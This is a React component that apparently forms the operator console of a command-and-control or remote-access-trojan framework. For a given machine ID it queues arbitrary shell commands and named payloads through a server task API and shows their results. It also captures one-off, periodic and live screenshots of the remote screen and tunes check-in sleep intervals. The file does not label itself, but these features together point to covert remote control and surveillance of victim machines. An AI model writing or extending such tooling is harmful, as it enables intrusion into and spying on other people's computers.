import React, { useState, useEffect, useRef } from 'react'
import { createPortal } from 'react-dom'
import VkCheckbox from '../components/VkCheckbox'
import SendPayloadInline from '../components/SendPayloadInline'
import { genId, watchForResult, watchForScreenshot } from '../lib/utils'

export default function MachinePanel({server, machineId, payloads=[], nicknames = {}, setNickname}){
  const [terminalCmd, setTerminalCmd] = useState('')
  const [log, setLog] = useState([])
  const terminalRef = useRef(null)
  const [screenshot, setScreenshot] = useState(null)
  const [live, setLive] = useState(false)
  const [periodicEnabled, setPeriodicEnabled] = useState(false)
  const [maxScreens, setMaxScreens] = useState(null)
  const [minSleep, setMinSleep] = useState(null)
  const [maxSleep, setMaxSleep] = useState(null)
  const [savedScreensCount, setSavedScreensCount] = useState(0)
  const [screenshotsList, setScreenshotsList] = useState([])
  const [galleryOpen, setGalleryOpen] = useState(false)
  const [fullImage, setFullImage] = useState(null)
  const [deleteCandidate, setDeleteCandidate] = useState(null)
  const liveRef = useRef(null)
  const [liveFreq, setLiveFreq] = useState(2000)
  const screenshotIdRef = useRef(null)
  const [activeTab, setActiveTab] = useState('home')

  const runCmd = async () =>{
    if(!terminalCmd) return
    try{
      const id = genId()
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=CMD&machine_id=${encodeURIComponent(machineId)}&command=${encodeURIComponent(terminalCmd)}`
      const r = await fetch(url, {method:'POST'})
      if(r.ok){
        const waitMsg = `Waiting for result (task ${id})...`
        setLog(prev => [`Sent: ${terminalCmd}`, waitMsg, ...prev])
        setTerminalCmd('')
        watchForResult(server, id, machineId, (found) => {
          const pretty = typeof found.result === 'string' ? found.result : JSON.stringify(found.result)
          setLog(prev => {
            const cleaned = prev.filter(x => !x.startsWith(`Waiting for result (task ${id})`))
            return [`Result (${id}): ${pretty}`, ...cleaned]
          })
        })
      } else setLog(prev => [`Failed to send: ${r.status}`, ...prev])
    }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
  }

  useEffect(()=>{
    if(!terminalRef.current) return
    const t = setTimeout(()=>{ try{ terminalRef.current.scrollTop = terminalRef.current.scrollHeight }catch(e){} }, 40)
    return ()=> clearTimeout(t)
  }, [log])

  const sendPayload = async (payloadName) =>{
    try{
      const id = genId()
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=PAYLOAD&machine_id=${encodeURIComponent(machineId)}&command=${encodeURIComponent(payloadName)}`
      const r = await fetch(url, {method:'POST'})
      if(r.ok){
        const waitMsg = `Waiting for result (task ${id})...`
        setLog(prev => [`Queued payload: ${payloadName}`, waitMsg, ...prev])
        watchForResult(server, id, machineId, (found) => {
          const pretty = typeof found.result === 'string' ? found.result : JSON.stringify(found.result)
          setLog(prev => {
            const cleaned = prev.filter(x => !x.startsWith(`Waiting for result (task ${id})`))
            return [`Result (${id}): ${pretty}`, ...cleaned]
          })
        })
      } else setLog(prev => [`Payload queue failed: ${r.status}`, ...prev])
    }catch(e){ setLog(prev => [`Error: ${String(e)}`, ...prev]) }
  }

  const requestScreenshotOnce = async () =>{
    try{
      const id = genId()
      const url = `${server}/addtask?task_id=${encodeURIComponent(id)}&task_type=SCREENSHOT&machine_id=${encodeURIComponent(machineId)}`
      await fetch(url, {method:'POST'})
      setScreenshot(null)
      watchForScreenshot(server, id, machineId, (found) => {
        setScreenshot(found.image_b64)
      })
    }catch(e){ setLog(prev => [`Error requesting screenshot: ${String(e)}`, ...prev]) }
  }

  const loadScreenshots = async () =>{
    try{
      const r = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId))
      const d = await r.json()
      const list = (d.screenshots || [])
      setScreenshotsList(list)
      setSavedScreensCount(list.length)
      if (list.length){
        const last = list[list.length - 1]
        setScreenshot(last.image_b64)
        screenshotIdRef.current = last.id
      } else {
        setScreenshot(null)
        screenshotIdRef.current = null
      }
    }catch(e){}
  }

  const downloadImage = (b64, id) =>{
    try{
      const a = document.createElement('a')
      a.href = `data:image/png;base64,${b64}`
      a.download = `${machineId}_${id || Date.now()}.png`
      document.body.appendChild(a)
      a.click()
      a.remove()
    }catch(e){ setLog(prev => [`Download error: ${String(e)}`, ...prev]) }
  }

  const openFullImage = (s) => setFullImage(s)
  const closeFullImage = () => setFullImage(null)

  const togglePin = async (id, currentlyPinned) => {
    try{
      const r = await fetch(server + '/screenshot_pin?id=' + encodeURIComponent(id) + '&pinned=' + (currentlyPinned ? 'false' : 'true'), { method: 'POST' })
      if(r.ok){ await loadScreenshots() }
    }catch(err){ setLog(prev => [`Pin error: ${String(err)}`, ...prev]) }
  }

  const confirmDelete = async (s) => {
    if(!s) return
    try{
      const r = await fetch(server + '/screenshot?id=' + encodeURIComponent(s.id), { method: 'DELETE' })
      if(r.ok){ setDeleteCandidate(null); await loadScreenshots() }
      else { const d = await r.json(); setLog(prev => [`Delete failed: ${d.reason||'error'}`, ...prev]); setDeleteCandidate(null); await loadScreenshots() }
    }catch(err){ setLog(prev => [`Delete screenshot error: ${String(err)}`, ...prev]); setDeleteCandidate(null) }
  }
  const cancelDelete = () => setDeleteCandidate(null)

  useEffect(()=>{
    let mounted = true
    ;(async ()=>{
      try{
        const r = await fetch(server + '/clients_status')
        const d = await r.json()
        const info = (d.clients_status || {})[machineId] || {}
        if(mounted) setPeriodicEnabled(Boolean(info.periodic_screenshots))
        try{ const rc = await fetch(server + '/machine_config?machine_id=' + encodeURIComponent(machineId)); const dc = await rc.json(); if(mounted){ setMaxScreens(dc.config && dc.config.max_screen_images); setMinSleep(dc.config && dc.config.min_sleep); setMaxSleep(dc.config && dc.config.max_sleep) } }catch(e){}
        try{ await loadScreenshots() }catch(e){}
      }catch(e){}
    })()
    return ()=> mounted = false
  }, [server, machineId])

  const togglePeriodic = async () =>{
    try{ const enable = !periodicEnabled; const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${enable ? 'true':'false'}`; const r = await fetch(url, { method: 'POST' }); if(r.ok){ setPeriodicEnabled(enable) } }catch(e){ setLog(prev => [`Toggle periodic error: ${String(e)}`, ...prev]) }
  }

  const saveConfig = async () =>{
    try{ const body = { machine_id: machineId, max_screen_images: maxScreens, min_sleep: minSleep, max_sleep: maxSleep }; const r = await fetch(server + '/set_machine_config', { method: 'POST', headers: {'content-type':'application/json'}, body: JSON.stringify(body) }); if(r.ok){ try{ const rs = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId)); const ds = await rs.json(); setSavedScreensCount((ds.screenshots||[]).length) }catch(e){} } }catch(e){ setLog(prev => [`Save config error: ${String(e)}`, ...prev]) }
  }

  useEffect(() => {
    let mounted = true
    let iv = null
    const poll = async () => { if (!mounted) return; try{ await loadScreenshots() }catch(e){} }
    poll()
    iv = setInterval(poll, 2000)
    return () => { mounted = false; if (iv) clearInterval(iv) }
  }, [server, machineId])

  const startLive = () =>{
    if(liveRef.current) return
    setLive(true)
    requestScreenshotOnce()
    const iv = setInterval(()=> requestScreenshotOnce(), Math.max(500, Number(liveFreq) || 2000))
    liveRef.current = iv
  }
  const stopLive = () =>{ setLive(false); if(liveRef.current){ clearInterval(liveRef.current); liveRef.current = null } }
  const handleLiveToggle = (on) => { if (on) startLive(); else stopLive(); }

  return (
    <div className='machinePanel'>
      <div className='machineHeader'>
        <div>
          <h3>Machine</h3>
          <div className='small'>{machineId} {nicknames && nicknames[machineId] ? <span style={{color:'var(--muted)', marginLeft:8}}>({nicknames[machineId]})</span> : null}</div>
        </div>
        <div className='machineActions'>
          <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
          <button className='btn' onClick={()=>{ const res = window.prompt('Set nickname for this machine (blank to clear):', nicknames && nicknames[machineId] ? nicknames[machineId] : ''); if(res !== null){ setNickname && setNickname(machineId, res || '') } }}>Set Nickname</button>
          <button className='btn' onClick={()=>{ /* TODO: remote check-in actions */ }}>Refresh</button>
        </div>
      </div>

      <div className='machineTabs'>
        <button className={`tabBtn ${activeTab==='home' ? 'active':''}`} onClick={()=>setActiveTab('home')}>Home</button>
        <button className={`tabBtn ${activeTab==='screen' ? 'active':''}`} onClick={()=>setActiveTab('screen')}>Screen</button>
        <button className={`tabBtn ${activeTab==='config' ? 'active':''}`} onClick={()=>setActiveTab('config')}>Config</button>
      </div>

      {activeTab === 'home' && (
        <>
          <div className='card'>
            <h4>Terminal</h4>
            <div style={{marginTop:10}}>
              <h5>Terminal output</h5>
              <div ref={terminalRef} className='terminalWindow'>
                {log.map((l,i)=> {
                  const cls = l.startsWith('Sent:') ? 'term-sent' : (l.startsWith('Waiting for result') ? 'term-wait' : (l.startsWith('Result') ? 'term-result' : (l.startsWith('Failed')||l.startsWith('Error') ? 'term-error' : '')))
                  return <div key={i} className={'terminalLine ' + cls}>{l}</div>
                })}
              </div>
            </div>
            <div style={{marginTop:8}} className='terminalBox'>
              <input autoFocus value={terminalCmd} onChange={e=>setTerminalCmd(e.target.value)} onKeyDown={e=>{ if(e.key === 'Enter'){ e.preventDefault(); runCmd() } }} className='terminalInput' placeholder='e.g. whoami or ipconfig' />
              <button className='btn btn--fancy' onClick={runCmd}>Run</button>
            </div>
          </div>

          <div className='card'>
            <h4>Payloads</h4>
            <div className='payloadGrid'>
              {payloads.map(p => <button key={p.id} className='payloadBtn' onClick={()=>sendPayload(p.file_name)}>{p.file_name}</button>)}
            </div>
          </div>
        </>
      )}

      {activeTab === 'screen' && (
        <div className='card tabContent active'>
          <h4>Screen</h4>
          <div style={{display:'flex', gap:12, alignItems:'center'}}>
            <button className='btn' onClick={requestScreenshotOnce}>Request</button>

            <VkCheckbox className='vk-small' checked={periodicEnabled} onChange={async (on) => { try{ const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${on ? 'true':'false'}`; const r = await fetch(url, { method:'POST' }); if(r.ok) setPeriodicEnabled(on) }catch(err){ setLog(prev => [`Toggle error: ${String(err)}`, ...prev]) } }} label={periodicEnabled ? 'Periodic ON' : 'Periodic OFF'} />

            <VkCheckbox className='vk-small' checked={live} onChange={(on)=>{ setLive(on); handleLiveToggle(on) }} label={live ? 'Live ON' : 'Live OFF'} />

            <div style={{display:'flex', alignItems:'center', gap:8, marginLeft:'auto'}}>
              <label className='small'>Freq (ms)</label>
              <input type='number' value={liveFreq} onChange={e=>setLiveFreq(Number(e.target.value||2000))} style={{width:120, padding:6, borderRadius:8, border:'1px solid rgba(255,255,255,0.03)', background:'transparent'}} />
            </div>
          </div>

          {galleryOpen && createPortal(
            <div className='galleryModal' onClick={()=>setGalleryOpen(false)}>
              <div className='galleryContent' onClick={e=>e.stopPropagation()}>
                <button className='modalClose' onClick={()=>setGalleryOpen(false)}>Close</button>
                <h3 style={{color:'var(--accent)'}}>All Screenshots ({screenshotsList.length})</h3>
                <div style={{height:12}} />
                <div className='galleryGrid'>
                  {screenshotsList.slice().reverse().map(s => (
                    <div key={s.id} className='thumb' style={{borderRadius:8}}>
                      <div className='thumbPreview' onClick={()=>openFullImage(s)}>
                        <img className='thumbImg' alt={s.id} src={s.image_b64 ? `data:image/png;base64,${s.image_b64}` : ''} />
                      </div>
                      <div className='thumbMeta'>
                        <div className='thumbTime'>{s.task_id ? s.task_id : new Date((s.timestamp||0)*1000).toLocaleString()}</div>
                        <div style={{display:'flex', gap:8}}>
                          <button className='thumbDelete' onClick={async ()=>{ setDeleteCandidate(s) }} disabled={s.pinned} title={s.pinned? 'Pinned — unpin to delete':''}>{s.pinned? 'Pinned' : 'Del'}</button>
                          <button className='thumbDelete' onClick={()=>downloadImage(s.image_b64, s.id)}>↓</button>
                          <button className='thumbDelete' onClick={()=>togglePin(s.id, !!s.pinned)} title={s.pinned? 'Unpin screenshot':'Pin screenshot'}>{s.pinned? '📌':'📍'}</button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>,
            document.body
          )}

          {fullImage && createPortal(
            <div className='galleryModal' onClick={closeFullImage}>
              <div className='galleryContent' onClick={e=>e.stopPropagation()} style={{display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center'}}>
                <button className='modalClose' onClick={closeFullImage}>Close</button>
                <div style={{display:'flex', gap:12, alignItems:'center', marginBottom:12}}>
                  <button className='btn' onClick={()=>downloadImage(fullImage.image_b64, fullImage.id)}>Download</button>
                  <button className='btn' onClick={()=>togglePin(fullImage.id, !!fullImage.pinned)}>{fullImage.pinned? 'Unpin':'Pin'}</button>
                </div>
                <div style={{maxWidth:'90%', maxHeight:'80vh', display:'flex', alignItems:'center', justifyContent:'center'}}>
                  <img alt={fullImage.id} src={fullImage.image_b64 ? `data:image/png;base64,${fullImage.image_b64}` : ''} style={{width:'100%', height:'auto', maxHeight:'80vh', objectFit:'contain', borderRadius:10}} />
                </div>
              </div>
            </div>,
            document.body
          )}

          {deleteCandidate && createPortal(
            <div className='galleryModal' onClick={cancelDelete}>
              <div className='galleryContent' onClick={e=>e.stopPropagation()} style={{width:420, padding:24, borderRadius:12, textAlign:'center'}}>
                <h3 style={{color:'var(--accent)'}}>Confirm delete</h3>
                <div style={{marginTop:8, color:'var(--muted)'}}>Are you sure you want to delete this screenshot? This cannot be undone.</div>
                <div style={{height:18}} />
                <div style={{display:'flex', gap:8, justifyContent:'center'}}>
                  <button className='btn' onClick={cancelDelete}>Cancel</button>
                  <button className='btn btn--fancy' onClick={()=>confirmDelete(deleteCandidate)}>Delete</button>
                </div>
              </div>
            </div>,
            document.body
          )}

          <div style={{marginTop:8}}>
            {screenshot ? (
              <img alt='screenshot' src={`data:image/png;base64,${screenshot}`} style={{maxWidth:'100%', borderRadius:8, border:'1px solid rgba(255,255,255,0.03)'}} />
            ) : (
              <div style={{padding:12}} className='term-wait'>No screenshot yet</div>
            )}

            <div className='screenshotGallery'>
              {screenshotsList.length === 0 && <div style={{color:'var(--muted)'}}>No saved screenshots</div>}
              {screenshotsList.slice(-5).map(s => (
                <div key={s.id} className='thumb'>
                  <div className='thumbPreview' onClick={()=>{ setScreenshot(s.image_b64); screenshotIdRef.current = s.id }}>
                    <img className='thumbImg' alt={s.id} src={s.image_b64 ? `data:image/png;base64,${s.image_b64}` : ''} />
                  </div>
                  <div className='thumbMeta'>
                    <div className='thumbTime'>{s.task_id ? s.task_id : new Date((s.timestamp||0)*1000).toLocaleString()}</div>
                    <div style={{display:'flex', gap:8}}>
                      <button className='thumbDelete' onClick={(e)=>{ e.stopPropagation(); setDeleteCandidate(s) }} disabled={s.pinned} title={s.pinned? 'Pinned — unpin to delete':''}>{s.pinned? 'Pinned' : 'Del'}</button>
                      <button className='thumbDelete' onClick={(e)=>{ e.stopPropagation(); downloadImage(s.image_b64, s.id) }}>↓</button>
                      <button className='thumbDelete' onClick={(e)=>{ e.stopPropagation(); togglePin(s.id, !!s.pinned) }} title={s.pinned? 'Unpin screenshot':'Pin screenshot'}>{s.pinned? '📌':'📍'}</button>
                      <button className='thumbDelete' onClick={(e)=>{ e.stopPropagation(); openFullImage(s) }} title='View fullscreen'>⤢</button>
                    </div>
                  </div>
                </div>
              ))}
              {screenshotsList.length > 5 && (
                <div className='thumb' onClick={()=>setGalleryOpen(true)} style={{cursor:'pointer'}}>
                  <div className='thumbMore'>+{screenshotsList.length - 5} more</div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {activeTab === 'config' && (
        <div className='card'>
          <h4>Config</h4>
          <div style={{display:'flex', gap:8, alignItems:'center', marginTop:6}}>
            <div style={{display:'flex', flexDirection:'column'}}>
              <label className='small'>Periodic screenshots</label>
              <div style={{display:'flex', gap:8, marginTop:6, alignItems:'center'}}>
                <VkCheckbox className='vk-small' checked={periodicEnabled} onChange={async (on) => { try{ const url = `${server}/toggle_periodic_screenshots?machine_id=${encodeURIComponent(machineId)}&enabled=${on ? 'true':'false'}`; const r = await fetch(url, { method:'POST' }); if(r.ok) setPeriodicEnabled(on) }catch(err){ setLog(prev => [`Toggle error: ${String(err)}`, ...prev]) } }} />
                <button className='btn' onClick={()=>{ navigator.clipboard && navigator.clipboard.writeText(machineId) }}>Copy ID</button>
                <button className='btn' onClick={async ()=>{ try{ const r = await fetch(server + '/screenshots?machine_id=' + encodeURIComponent(machineId)); const d = await r.json(); setSavedScreensCount((d.screenshots||[]).length) }catch(e){ setLog(prev => [`Refresh screenshots error: ${String(e)}`, ...prev]) } }}>Refresh</button>
              </div>
            </div>

            <div style={{display:'flex', gap:12, alignItems:'center'}}>
              <div style={{display:'flex', flexDirection:'column'}}>
                <label className='small'>Max screenshots to keep</label>
                <input type='number' className='configNumber' value={maxScreens || ''} onChange={e=>setMaxScreens(e.target.value? Number(e.target.value): null)} style={{width:140}} />
              </div>

              <div style={{display:'flex', flexDirection:'column'}}>
                <label className='small'>Min sleep (s)</label>
                <input type='number' className='configNumber' value={minSleep || ''} onChange={e=>setMinSleep(e.target.value? Number(e.target.value): null)} style={{width:120}} />
              </div>

              <div style={{display:'flex', flexDirection:'column'}}>
                <label className='small'>Max sleep (s)</label>
                <input type='number' className='configNumber' value={maxSleep || ''} onChange={e=>setMaxSleep(e.target.value? Number(e.target.value): null)} style={{width:120}} />
              </div>

              <div style={{display:'flex', alignItems:'center', gap:8}}>
                <button className='btn btn--fancy' onClick={saveConfig}>Save</button>
              </div>
            </div>

            <div style={{marginLeft:'auto', color:'var(--muted)'}}>Saved screenshots: {savedScreensCount}</div>
          </div>
        </div>
      )}
    </div>
  )
}
